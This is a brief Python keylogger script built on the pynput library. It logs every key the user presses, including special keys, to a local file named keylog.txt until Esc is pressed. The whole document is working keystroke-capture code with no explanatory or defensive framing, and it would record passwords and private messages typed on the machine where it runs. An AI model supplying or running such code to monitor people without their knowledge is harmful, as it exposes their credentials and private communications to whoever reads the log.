from pynput import keyboard

# Define a file to save the logged keys
log_file = "keylog.txt"

def on_press(key):
    try:
        # Write the key to the file
        with open(log_file, "a") as f:
            f.write(f'{key.char}')
    except AttributeError:
        # Handle special keys (e.g., space, enter)
        with open(log_file, "a") as f:
            f.write(f'[{key}]')

def on_release(key):
    # Stop listener
    if key == keyboard.Key.esc:
        return False

# Set up the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
